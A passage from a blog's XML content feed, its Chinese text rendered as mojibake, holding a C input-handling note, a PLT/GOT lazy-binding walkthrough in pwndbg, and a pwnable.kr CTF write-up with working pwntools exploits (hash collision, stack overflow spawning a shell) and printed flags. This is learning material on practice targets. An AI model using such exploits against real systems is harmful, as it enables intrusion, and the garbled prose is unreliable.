Â¶ÇÊûúË¶ÅÁ®ãÂ∫èÁöÑÂÅ•Â£ÆÊÄßÔºåÈÇ£‰πàÁî®Êà∑Â§öËæìÂÖ•‰∏Ä‰∏™Á©∫Ê†ºÂ∞±‰ºöÂá∫ÈîôÔºåÂõ†‰∏∫Â§öËæìÂÖ•‰∏Ä‰∏™Á©∫Ê†ºÁ®ãÂ∫èÂ∞±‰∏çÁü•ÈÅìÂêéÈù¢ÈÇ£‰∏™ÊòØ‰ªÄ‰πà‰∫ÜÔºåÂêåÊó∂ËøòÊ∂âÂèäÂà∞getcharÂáΩÊï∞Ê∏ÖÁ©∫ÁºìÂÜ≤Âå∫ÔºåÈÇ£‰∏™whileÂæ™ÁéØÁöÑÂÜôÊ≥ïÁ°ÆÂÆûÂæàÁªèÂÖ∏Ôºå‰ΩÜÊòØÂ∞±Ê≤°ÊúâËÄÉËôëËøáÂ¶ÇÊûúÁºìÂÜ≤Âå∫Êú¨Ë∫´Â∞±ÊòØÁ©∫ÁöÑÂë¢Ôºü Êàë‰øÆÊîπ‰∫Ü‰∏Ä‰∏ãÂéüÊúâÁöÑ‰ª£Á†ÅÔºåÂä†ÂÖ•‰∫Ücin.peekÂáΩÊï∞Êù•Â∏ÆÂä©Âà§Êñ≠ 12345678910111213141516171819202122232425262728while (1)&#123; nums = (int*)realloc(nums, sizeof(int) * (i + 1)); scanf("%d", &amp;nums[i]); i++; char ch = getchar(); if (ch == ' ') &#123; if (isdigit(cin.peek())) &#123; continue; &#125; else &#123; break; &#125; &#125; if (ch == '\n') &#123; break; &#125;&#125;// for(;scanf("%d", &amp;nums[i]) != 0 &amp;&amp; getchar() == '\n'; i++)// &#123;// nums = (int *)realloc(nums, sizeof(int)*(i+1));// &#125;fflush(stdin);]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>ÁºìÂÜ≤Âå∫</tag>
        <tag>getchar</tag>
        <tag>x86</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[blog Êõ¥Êñ∞Â∞èËÆ∞]]></title>
    <url>%2F2019%2F07%2F30%2Fblog-%E6%9B%B4%E6%96%B0%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Êõ¥Êñ∞ ÁÆÄÂçïÂú∞Êõ¥Êñ∞‰∫Ü‰∏Ä‰∏ãËá™Â∑±ÁöÑblogÔºåËôΩÁÑ∂ÊòØËøô‰πàËØ¥Ôºå‰ΩÜÊòØÂÆûÈôÖ‰∏äËøòÊòØËä±‰∫Ü‰∏çÂ∞ëÊó∂Èó¥Êù•ÂÆåÂñÑÔºå‰∏ªË¶ÅÊúâÔºö ‰øÆÊîπ‰∫Ü‰ª£Á†ÅÁöÑÈ´ò‰∫ÆÊ†ºÂºèÔºåÈªëËâ≤ÁöÑ‰∏ªÈ¢òÊõ¥Â•ΩÁúã‰∏Ä‰∫õ Êõ¥Êç¢‰∫ÜblogÁöÑmarkdownÂºïÊìéÔºåÂèØ‰ª•Ê∏≤Êüìemoj‰∫Ü ‰øÆÊîπ‰∫ÜËá™Êàë‰ªãÁªçÔºåÂéªÊéâ‰∫ÜÁΩëÊòì‰∫ëÈü≥‰πêÁöÑÂ§ñÈìæÔºåÂõ†‰∏∫Â§±Êïà‰∫ÜÔºåÂêåÊó∂Ê∑ªÂä†‰∫ÜÁÆÄ‰π¶ÂíåÁü•‰πéÈìæÊé• Ê∑ªÂä†‰∫ÜÂèãÈìæ Ê∑ªÂä†‰∫ÜËØÑËÆ∫gitment TODO ÊêúÁ¥¢ÂäüËÉΩÊ≤°ÊúâÊ≤°Ê≥ïÁî® blogËøòÂèØ‰ª•Êõ¥ÁæéÂåñ‰∏ÄÁÇπ ‰∏ÄÁÇπÊÑüÊÉ≥ ÂñúÊ¨¢Ëá™Â∑±Êê≠Âª∫ÁöÑËøô‰∏™Â∞èÂ§©Âú∞ÔºåËôΩÁÑ∂ÊúâËøô‰πàÊàñËÄÖÈÇ£‰πàÁöÑ‰∏çÂÆåÂñÑÔºå‰ΩÜÊòØËøô‰∏™blogËßÅËØÅÁùÄÊàëÁöÑÊàêÈïøÔºÅ]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ËÅäËÅäplt‰∏égot]]></title>
    <url>%2F2019%2F07%2F24%2F%E8%81%8A%E8%81%8Aplt%E4%B8%8Egot%2F</url>
    <content type="text"><![CDATA[Ê∑±ÂÖ•ÁêÜËß£pltÂíågot ÂÖàÂÜô‰∏ÄÊÆµ‰ª£Á†ÅÔºö 123456789// Build with: gcc -m32 --no-pie -g -o plt plt.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; puts("Hello world!"); exit(0);&#125; ÈÄî‰∏≠ÈÅáÂà∞‰∫Ü‰∏Ä‰∏™Êä•ÈîôÔºö 1234In file included from /usr/include/stdio.h:27:0, from plt.c:3:/usr/include/features.h:374:25: fatal error: sys/cdefs.h: No such file or directory # include &lt;sys/cdefs.h&gt; ÁÑ∂ÂêéÂÆâË£Ö‰∏Ä‰∏™: apt install libc6-dev-i386 ÁºñËØëÂ•ΩÁ®ãÂ∫è‰πãÂêé 1234567$ checksec plt [*] &apos;/home/pxy/pwnable/plt&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Á®ãÂ∫èÊòØÊ≤°ÊúâpieÁöÑ readelf -S pltÊü•ÁúãËäÇË°® 12345[Nr] Name Type Addr Off Size ES Flg Lk Inf Al[12] .plt PROGBITS 08048300 000300 000050 04 AX 0 0 16[13] .text PROGBITS 08048350 000350 000192 00 AX 0 0 16[22] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4[23] .got.plt PROGBITS 0804a000 001000 00001c 04 WA 0 0 4 ÂèØ‰ª•ÁúãÂà∞Ôºö .plt Âü∫Âú∞ÂùÄ‰∏∫Ôºö 0x08048300 .got Âü∫Âú∞ÂùÄ‰∏∫Ôºö 0x08049ffc .got.plt Âü∫Âú∞ÂùÄ‰∏∫Ôºö 0x0x804a000 Êàë‰ª¨‰ªéË∞ÉÁî®putsÂáΩÊï∞ÈÇ£ÈáåÂºÄÂßãÂçïÊ≠•ÊâßË°å È¶ñÂÖàË∑≥ËΩ¨Âà∞pltË°®‰∏≠ 120x804845d &lt;main+16&gt; call puts@plt &lt;0x8048310&gt;0x8048310 &lt;puts@plt&gt; jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt; call puts‰πãÂêéÔºå‰∏ã‰∏ÄÊù°Êåá‰ª§‰πüÊòØ‰∏Ä‰∏™Ë∑≥ËΩ¨ jmp dword ptr [puts@got.plt] &lt;0x804a00c&gt; ËøôÊù°Êåá‰ª§ÁöÑÊÑèÊÄùÊòØÂèñÂá∫puts@got.pltË°®‰∏≠ÁöÑÂÄºÔºåÊîæÂà∞pcÂØÑÂ≠òÂô®‰∏≠ ÊâÄ‰ª•ÔºüÊü•Áúã‰∏Ä‰∏ãÊ≠§Â§ÑÂÜÖÂ≠òÁöÑÂÄºÔºö 12pwndbg&gt; x/2x 0x804a00c0x804a00c &lt;puts@got.plt&gt;: 0x08048316 0x08048326 ÊâÄ‰ª•‰∏ã‰∏ÄÊù°Êåá‰ª§ÁöÑÂú∞ÂùÄÂ∞±ÊòØ0x08048316ËøòÊòØÂú®pltË°®‰∏≠ 12‚ñ∫ 0x8048316 &lt;puts@plt+6&gt; push 0 0x804831b &lt;puts@plt+11&gt; jmp 0x8048300 ËøôÈáåÂÖàÂ∞Ü0ÊîæÂà∞Ê†à‰∏äÔºåË°®ÊòéÊòØË¶ÅËß£ÊûêputsÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºåÁÑ∂ÂêéÂÜçË∑≥ËΩ¨Âà∞0x8048300‰πüÂ∞±ÊòØpltË°®ÁöÑÂºÄÂßãÈÉ®ÂàÜ 12‚ñ∫ 0x8048300 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048306 jmp dword ptr [0x804a008] &lt;0xf7ff0650&gt; ËøôÊó∂ÂÄôÂÖàÊää.got.pltË°®‰∏≠ÁöÑÁ¨¨‰∫åÈ°πÊîæÂà∞Ê†à‰∏ä ÂÖàÊü•Áúã‰∏Ä‰∏ã.got.plt‰∏≠Ââç‰∏âÈ°πÁöÑÂÜÖÂÆπ: 12pwndbg&gt; x/3x 0x804a0000x804a000: 0x08049f14 0xf7ffd938 0xf7ff0650 Â∞Ü0xf7ffd938ÊîæÁΩÆÂà∞Ê†à‰∏äÔºåÁÑ∂ÂêéË∑≥ËΩ¨Âà∞.got.plt‰∏≠ÁöÑÁ¨¨‰∏âÈ°πÔºå‰πüÂ∞±ÊòØ 0xf7ff0650ÔºåËøô‰∏™Âú∞ÂùÄÂ∞±ÊòØ_dl_runtime_resolveÂáΩÊï∞ÁöÑÂú∞ÂùÄ Ë¥üË¥£Ëß£ÊûêÂáΩÊï∞ÁöÑÂú∞ÂùÄ Ê≠§Êó∂Êàë‰ª¨ÁöÑgotË°®ÂÜÖÂÆπÂ¶Ç‰∏ãÔºö 12345678pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 4[0x804a00c] puts -&gt; 0x8048316 (puts@plt+6) ‚óÇ‚Äî push 0 /* &apos;h&apos; */[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) ‚óÇ‚Äî push 8[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) ‚óÇ‚Äî push 0x10[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) ‚óÇ‚Äî push ebp putsÂáΩÊï∞ÁöÑÂú∞ÂùÄËøòÊ≤°ÊúâÈáçÂÆö‰Ωç ÂΩìÊàë‰ª¨ÊâßË°åËøá‰∏ÄÈÅçputsÂáΩÊï∞‰πãÂêé ËøôÊó∂ÂÄôÂõûËøáÂ§¥Êù•ÁªßÁª≠Êü•ÁúãgotË°®‰∏≠ÁöÑÂÜÖÂÆπÔºö 12345678pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 4[0x804a00c] puts -&gt; 0xf7e727e0 (puts) ‚óÇ‚Äî push ebp[0x804a010] __gmon_start__ -&gt; 0x8048326 (__gmon_start__@plt+6) ‚óÇ‚Äî push 8[0x804a014] exit -&gt; 0x8048336 (exit@plt+6) ‚óÇ‚Äî push 0x10[0x804a018] __libc_start_main -&gt; 0xf7e26a00 (__libc_start_main) ‚óÇ‚Äî push ebp ÂèØ‰ª•ÁúãÂà∞Âú∞ÂùÄÂ∑≤ÁªèÈáçÂÆö‰ΩçÂ•Ω‰∫Ü ËøôÂíåWindowsÁöÑPEÊñá‰ª∂Ê†ºÂºè‰ºº‰πéÊúâÁÇπ‰∏çÂêå‰∫ÜÔºåPEÊñá‰ª∂ÊòØË£ÖËΩΩËøõÂÜÖÂ≠ò‰πãÂêéÂáΩÊï∞Âú∞ÂùÄÈÉΩÂ∑≤ÁªèÈáçÂÆö‰ΩçÂ•Ω‰∫ÜÔºåËÄåLinuxÁöÑelfÊñá‰ª∂ÂàöÂàöË£ÖËøõÂÜÖÂ≠ò‰πãÂêéÂáΩÊï∞ÁöÑÂú∞ÂùÄËøòÊòØ‰∏çÁ°ÆÂÆöÁöÑÔºåÈúÄË¶ÅÂú®ËøêË°åÁöÑÊó∂ÂÄôËøõË°åÈáçÂÆö‰Ωç„ÄÇ ÂΩìÊàë‰ª¨Â∞Ü‰ª£Á†Å‰øÆÊîπ‰∏∫Â¶Ç‰∏ãÊó∂Ôºö 1234567891011pwndbg&gt; l 1, 20// Build with: gcc -m32 -no-pie -g -o plt plt.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123; puts("Hello world!"); puts("hello world again !!!"); exit(0);&#125; Á¨¨‰∏ÄÊ¨°Ë∞ÉÁî®putsÂáΩÊï∞‰πãÂêéÔºö [0x804a00c] puts -&gt; 0xf7e727e0 (puts) ‚óÇ‚Äî push ebp putsÂáΩÊï∞Âú∞ÂùÄÂ∑≤ÁªèÈáçÂÆö‰ΩçÂ•Ω‰∫Ü Êé•‰∏ãÊù•ÂÜçÊ¨°Ë∞ÉÁî®putsÂáΩÊï∞ 123456‚ñ∫ 0x8048310 &lt;puts@plt&gt; jmp dword ptr [0x804a00c] &lt;0xf7e727e0&gt; ‚Üì 0xf7e727e0 &lt;puts&gt; push ebp 0xf7e727e1 &lt;puts+1&gt; push edi 0xf7e727e2 &lt;puts+2&gt; push esi 0xf7e727e3 &lt;puts+3&gt; push ebx Ê≠§Êó∂ÂèØ‰ª•ÁúãÂà∞Áõ¥Êé•Â∞±Ë∑≥Âà∞ÂáΩÊï∞ÁöÑÂú∞ÂùÄ‰∫Ü Âõ†‰∏∫Ê≠§Êó∂ÁöÑ.got.pltÂ∑≤ÁªèÊòØputsÂáΩÊï∞ÁöÑÂú∞ÂùÄ‰∫ÜÔºå Linux tql Êï¥ÁêÜ‰∏Ä‰∏ã ‰πãÂâçÁúãÂèÇËÄÉËµÑÊñô‰∏≠Âçö‰∏ªÁöÑÊñáÁ´†‰∏ÄÁõ¥Ê≤°ÊúâÂæàÁêÜËß£ÔºåËøôÈáåÁõ¥Êé•Áªü‰∏ÄËØ¥‰∏Ä‰∏ãÊàëÁöÑÁêÜËß£Ôºö ‰ΩïË∞ìPLT‰∏éGOT ÂÖ∂ÂÆûËøôÈáåÂáÜÁ°ÆÁöÑÊù•ËØ¥Â∫îËØ•Âè´got.pltËÄå‰∏çÊòØÂè´gotÔºå‰∏çËøá‰∏∫‰∫ÜÊñπ‰æøÊàë‰ª¨ËøòÊòØÂè´ÂÆÉgotË°®Âêß Ë¶ÅÊ≥®ÊÑèÈÇ£‰∏™jmp *printf@got *Âè∑ÊòØÂèñÂá∫Âú∞ÂùÄÂ§ÑÁöÑÂÄºÔºåÂπ∂‰∏çÊòØË∑≥Âà∞gotË°®‰∏≠Âéª Âª∂ËøüÈáçÂÆö‰Ωç ËøôÁØáÊñáÁ´†ÊàëËßâÂæóÂÜôÁöÑÂæàÁ≤æÂΩ© Linux‰∏∫‰∫ÜÁº©Âáè‰ª£Á†Å,Â∞±ÊòØÊåâÁÖßËøôÁßçÊ®°ÂºèÊù•ÁöÑÔºö 12345678910void printf@plt()&#123;address_good: jmp *printf@got // ÈìæÊé•Âô®Â∞Üprintf@gotÂ°´Êàê‰∏ã‰∏ÄËØ≠Âè•lookup_printfÁöÑÂú∞ÂùÄlookup_printf: Ë∞ÉÁî®ÈáçÂÆö‰ΩçÂáΩÊï∞Êü•ÊâæprintfÂú∞ÂùÄÔºåÂπ∂ÂÜôÂà∞printf@got goto address_good;&#125; ‰πüÂ∞±Âíå‰∏äÈù¢ÈÇ£Âº†ÂõæÊòØ‰∏Ä‰∏ÄÂØπÂ∫îÁöÑ ÂÖ¨ÂÖ±gotË°®È°π Âú®Ëß£ÊûêÂáΩÊï∞ÁöÑÁúüÊ≠£Âú∞ÂùÄÊó∂Ôºå _dl_runtime_resolveÊòØÊÄé‰πàÁü•ÈÅìÂÆÉË¶ÅËß£ÊûêÂì™‰∏™ÂáΩÊï∞ÁöÑ Âõ†‰∏∫Ôºö 1234printf@plt&gt;: jmp *0x80496f8 push $0x00 jmp common@plt ËøôÈáåpushÁöÑÂÄº‰∏ç‰∏ÄÊ†∑ÔºåÁõ∏ÂΩì‰∫éÂ∞±ÊòØÊØè‰∏™ÂáΩÊï∞Âèñ‰∫Ü‰∏Ä‰∏™id ‰πãÂêéÂ∞±ÊòØÂÖ¨ÂÖ±gotË°®ÁöÑÂÜÖÂÆπÔºö got[0]: Êú¨ELFÂä®ÊÄÅÊÆµ(.dynamicÊÆµÔºâÁöÑË£ÖËΩΩÂú∞ÂùÄ got[1]ÔºöÊú¨ELFÁöÑlink_mapÊï∞ÊçÆÁªìÊûÑÊèèËø∞Á¨¶Âú∞ÂùÄ got[2]Ôºö_dl_runtime_resolveÂáΩÊï∞ÁöÑÂú∞ÂùÄ Á©øÈíàÂºïÁ∫ø PLTË°®‰∏≠ÁöÑÁ¨¨‰∏ÄÈ°π‰∏∫ÂÖ¨ÂÖ±Ë°®È°πÔºåÂâ©‰∏ãÁöÑÊòØÊØè‰∏™Âä®ÊÄÅÂ∫ìÂáΩÊï∞‰∏∫‰∏ÄÈ°πÔºàÂΩìÁÑ∂ÊØèÈ°πÊòØÁî±Â§öÊù°Êåá‰ª§ÁªÑÊàêÁöÑÔºåjmp *0xXXXXXXXXËøôÊù°Êåá‰ª§ÊòØÊâÄÊúâpltÁöÑÂºÄÂßãÊåá‰ª§ÔºâÊØèÈ°πPLTÈÉΩ‰ªéÂØπÂ∫îÁöÑGOTË°®È°π‰∏≠ËØªÂèñÁõÆÊ†áÂáΩÊï∞Âú∞ÂùÄ GOTË°®‰∏≠Ââç3‰∏™‰∏∫ÁâπÊÆäÈ°πÔºåÂàÜÂà´Áî®‰∫é‰øùÂ≠ò .dynamicÊÆµÂú∞ÂùÄ„ÄÅÊú¨ÈïúÂÉèÁöÑlink_mapÊï∞ÊçÆÁªìÊûÑÂú∞ÂùÄÂíå_dl_runtime_resolveÂáΩÊï∞Âú∞ÂùÄÔºõ‰ΩÜÂú®ÁºñËØëÊó∂ÔºåÊó†Ê≥ïËé∑ÂèñÁü•ÈÅìlink_mapÂú∞ÂùÄÂíå_dl_runtime_resolveÂáΩÊï∞Âú∞ÂùÄÔºåÊâÄ‰ª•ÁºñËØëÊó∂Â°´Èõ∂Âú∞ÂùÄÔºåËøõÁ®ãÂêØÂä®Êó∂Áî±Âä®ÊÄÅÈìæÊé•Âô®ËøõË°åÂ°´ÂÖÖ ÂèÇËÄÉ ËÅäËÅäLinuxÂä®ÊÄÅÈìæÊé•‰∏≠ÁöÑPLTÂíåGOTÔºàÔºëÔºâ‚Äî‚Äî‰ΩïË∞ìPLT‰∏éGOT ËÅäËÅäLinuxÂä®ÊÄÅÈìæÊé•‰∏≠ÁöÑPLTÂíåGOTÔºàÔºíÔºâ‚Äî‚ÄîÂª∂ËøüÈáçÂÆö‰Ωç ËÅäËÅäLinuxÂä®ÊÄÅÈìæÊé•‰∏≠ÁöÑPLTÂíåGOTÔºàÔºìÔºâ‚Äî‚ÄîÂÖ¨ÂÖ±GOTË°®È°π ËÅäËÅäLinuxÂä®ÊÄÅÈìæÊé•‰∏≠ÁöÑPLTÂíåGOTÔºà4Ôºâ‚Äî‚Äî Á©øÈíàÂºïÁ∫ø GOT and PLT for pwning.]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable]]></title>
    <url>%2F2019%2F07%2F24%2Fpwnable%2F</url>
    <content type="text"><![CDATA[pwnable‰ªéÂ∞èÁôΩÂºÄÂßã pwnableÊòØ‰∏Ä‰∏™ÈÄÇÂêàÂ∞èÁôΩÁöÑÁΩëÁ´ô https://pwnable.kr/play.php fd ÊúâÊ∫êÁ†ÅÔºö 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; ËøôÈÅìÈ¢òÁõÆÊòØËÆ©‰Ω†‰∫ÜËß£Linux‰∏ãÁöÑÊñá‰ª∂ÊèèËø∞Á¨¶ 12345fd@prowl:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!fd@prowl:~$ collision 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; ÊûúÁÑ∂ÊàëËøòÊòØÂ∞èÁôΩÔºåËøûÊúÄÂü∫Êú¨ÁöÑÂ∏∏ËØÜÈÉΩ‰∏çÊáÇ‰∫ÜÔºåÊÑèËØÜÂà∞‰∫ÜÊòØÁî±ËæìÂÖ•ÁöÑargv[1]Êù•ËÆ°ÁÆóÁöÑÔºå20‰∏™Â≠óËäÇÊ≠£Â•ΩÂàÜÊàê5Ê¨°ÔºåÂ∞±ÊòØÊääÊØèÂõõ‰∏™Âä†Ëµ∑Êù•Â∞±Ë°å‰∫Ü„ÄÇ ÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•Êãø0x21DD09ECÂéªÈô§Êéâ5Â∞±Â•Ω‰∫Ü expÂ¶Ç‰∏ãÔºö 1234567from pwn import *pwn_ssh=ssh(host='pwnable.kr',user='col',password='guest',port=2222)print(pwn_ssh.connected())sh=pwn_ssh.process(argv=['collision','\xc9\xce\xc5\x06'*4+'\xc8\xce\xc5\x06'],executable='./col')print(sh.recvall()) ËøôÈáåËøòÂ≠¶Âà∞‰∫Ü‰∏ÄÊ≥¢Áî®pwnsshËøûÊé•ÁöÑ„ÄÇ bof Ê∫êÁ†ÅÔºö 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; ËøôÊòØ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÊ†àÊ∫¢Âá∫ÁöÑÈ¢òÁõÆ ËôΩÁÑ∂ÁÆÄÂçïÔºå‰ΩÜÊòØÂ∞èÁôΩËøòÊòØË¶Å‰ªîÁªÜÂú∞ÂàÜÊûê‰∏Ä‰∏ãÁöÑ„ÄÇ funcÂØπÂ∫îÁöÑÊ±áÁºñ‰ª£Á†ÅÔºåÂÖ∂ÂÆûÊÑüËßâÊ±áÁºñ‰ª£Á†ÅÁúãÁöÑÊõ¥ÊòéÁôΩ‰∏Ä‰∫õÔºö 12345678910111213141516171819202122.text:565D262C func proc near ; CODE XREF: main+10p.text:565D262C.text:565D262C s = byte ptr -2Ch.text:565D262C var_C = dword ptr -0Ch.text:565D262C arg_0 = dword ptr 8.text:565D262C.text:565D262C push ebp.text:565D262D mov ebp, esp.text:565D262F sub esp, 48h.text:565D2632 mov eax, large gs:14h ;gs‰øùÊä§Êú∫Âà∂.text:565D2638 mov [ebp+var_C], eax.text:565D263B xor eax, eax.text:565D263D mov dword ptr [esp], offset s ; &quot;overflow me : &quot;.text:565D2644 call near ptr puts+565D2649h.text:565D2649 lea eax, [ebp+s].text:565D264C mov [esp], eax ; s.text:565D264F call near ptr gets+565D2654h.text:565D2654 cmp [ebp+arg_0], 0CAFEBABEh.text:565D265B jnz short loc_565D266B.text:565D265D mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:565D2664 call near ptr system+565D2669h.text:565D2669 jmp short loc_565D2677 ‰πãÂâç‰∏ÄÁõ¥‰∏çÂ§™ÊòéÁôΩÂ¶ÇÊûúÂ±ÄÈÉ®ÂèòÈáèÊòØÊï∞ÁªÑËØ•ÊÄé‰πàÊêû ÂÖ≥ÈîÆÊòØËøôÈáåÔºö 12.text:565D2649 lea eax, [ebp+s].text:565D264C mov [esp], eax ; s Ê≥®ÊÑè lea eax, [ebp+s] ËøôÈáåÂä†‰∫ÜÊñπÊã¨Âè∑‰ΩÜÊòØÂÖ∂ÂÆûËøòÊòØÂú∞ÂùÄÔºåÂ∞±ÊòØÂ∞ÜÂ≠óÁ¨¶‰∏≤sÁöÑÂú∞ÂùÄËµãÂÄºÁªôeax ÁÑ∂ÂêéÂÜçÂ∞ÜÂÖ∂Â≠òÊîæÂà∞Ê†àÈ°∂Ôºå‰πãÂêéË∞ÉÁî®getsÂáΩÊï∞ÔºåÂ∞ÜËæìÂÖ•ÁöÑÂÄºÂ°´ÂÖ•Âà∞ÁºìÂÜ≤Âå∫ ‰ªéËøôÂº†ÂõæÂ∞±ËÉΩÊòéÁôΩÂÜÖÂ≠òÁöÑÂàÜÂ∏É‰∫Ü ËøôÈÅìÈ¢òÁõÆ‰øùÊä§Êú∫Âà∂Âü∫Êú¨ÈÉΩÂºÄ‰∫ÜÔºå‰ΩÜÊòØÊàë‰ª¨Âπ∂‰∏çÈúÄË¶ÅÊâßË°å‰ª£Á†Å„ÄÇÂè™ÈúÄË¶ÅË¶ÜÁõñÊ†à‰∏äÁöÑÂÄºÂ∞±Ë°å‰∫Ü„ÄÇ‰πü‰∏ç‰ºöËß¶Âèëgs‰øùÊä§Êú∫Âà∂ expÂ¶Ç‰∏ãÔºö 12345678from pwn import *payload = 'A'*52+'\xbe\xba\xfe\xca'r=remote('pwnable.kr',9000)print(r.connected())r.sendline(payload)r.interactive() ËøêË°åÊïàÊûúÂ¶Ç‰∏ãÔºö 12345678910111213pxy@ubuntu:~/pwnable$ python bofexp.py[+] Opening connection to pwnable.kr on port 9000: DoneTrue[*] Switching to interactive mode$ lsbofbof.cflagloglog2super.pl$ cat flagdaddy, I just pwned a buFFer :) flag ËøôÈÅìÈ¢òÁõÆË¢´upxÂä†Â£≥ÔºåLinux‰∏ãÁöÑÂä†Â£≥ÂÄíËøòÊòØÁ¨¨‰∏ÄÊ¨°ÈÅáÂà∞„ÄÇ Âà∞ËøôÈáåÂèØ‰ª•ÊâæÂà∞ËÑ±Â£≥ÁöÑÂ∑•ÂÖ∑ ËÑ±Â£≥‰πãÂêégdbËΩΩÂÖ•ÔºåÊü•ÁúãÂèçÊ±áÁºñ‰ª£Á†Å 1234567891011121314151617181920pwndbg&gt; disassemble mainDump of assembler code for function main: 0x0000000000401164 &lt;+0&gt;: push rbp 0x0000000000401165 &lt;+1&gt;: mov rbp,rsp 0x0000000000401168 &lt;+4&gt;: sub rsp,0x10 0x000000000040116c &lt;+8&gt;: mov edi,0x496658 0x0000000000401171 &lt;+13&gt;: call 0x402080 &lt;puts&gt; 0x0000000000401176 &lt;+18&gt;: mov edi,0x64 0x000000000040117b &lt;+23&gt;: call 0x4099d0 &lt;malloc&gt; 0x0000000000401180 &lt;+28&gt;: mov QWORD PTR [rbp-0x8],rax 0x0000000000401184 &lt;+32&gt;: mov rdx,QWORD PTR [rip+0x2c0ee5] # 0x6c2070 &lt;flag&gt; 0x000000000040118b &lt;+39&gt;: mov rax,QWORD PTR [rbp-0x8] 0x000000000040118f &lt;+43&gt;: mov rsi,rdx 0x0000000000401192 &lt;+46&gt;: mov rdi,rax 0x0000000000401195 &lt;+49&gt;: call 0x400320 0x000000000040119a &lt;+54&gt;: mov eax,0x0 0x000000000040119f &lt;+59&gt;: leave 0x00000000004011a0 &lt;+60&gt;: ret End of assembler dump.pwndbg&gt; b *0x0000000000401184 ÁÑ∂ÂêéÂú®Ê≠§Â§Ñ‰∏ãÊñ≠ÁÇπ 123456789RAX 0x6c96b0 ‚óÇ‚Äî 0x0RBX 0x401ae0 (__libc_csu_fini) ‚óÇ‚Äî push rbxRCX 0x8RDX 0x496628 ‚óÇ‚Äî push rbp /* &apos;UPX...? sounds like a delivery service :)&apos; */RDI 0x4RSI 0x0R8 0x1R9 0x3R10 0x22 ÂëΩ‰∏≠Êñ≠ÁÇπ‰πãÂêéÂçïÊ≠•‰∏ÄÊ¨°Â∞±Ë°å ËøôÊó∂ÂÄôÂ∞±ÁúãÂà∞ÂØÑÂ≠òÂô®ÁöÑÂèòÂåñ flagÂ∞±ÊòØÈÇ£‰∏™Êãâ2333 paascode Â≠¶Âà∞‰∫Ü‰∏ÄÁÇπ‰ªéËøúÁ®ãÊúçÂä°Âô®‰∏ãËΩΩ‰∏úË•øÁöÑÂëΩ‰ª§ $ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode . Ê∫êÁ†ÅÔºö 1234567891011121314151617181920212223242526272829303132333435363738394041424344$ cat passcode.c #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf("enter passcode1 : "); scanf("%d", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf("enter passcode2 : "); scanf("%d", passcode2); printf("checking...\n"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf("Login OK!\n"); system("/bin/cat flag"); &#125; else&#123; printf("Login Failed!\n"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf("enter you name : "); scanf("%100s", name); printf("Welcome %s!\n", name);&#125;int main()&#123; printf("Toddler's Secure Login System 1.0 beta.\n"); welcome(); login(); // something after login... printf("Now I can safely trust you that you have credential :)\n"); return 0;&#125; ‰Ωú‰∏∫‰∏ÄÂêçÂ∞èÁôΩËøòÊòØË¶ÅÂ•ΩÂ•ΩÂú∞ÂàÜÊûêÊ†àÂ∏ßÁöÑÊûÑÈÄ† 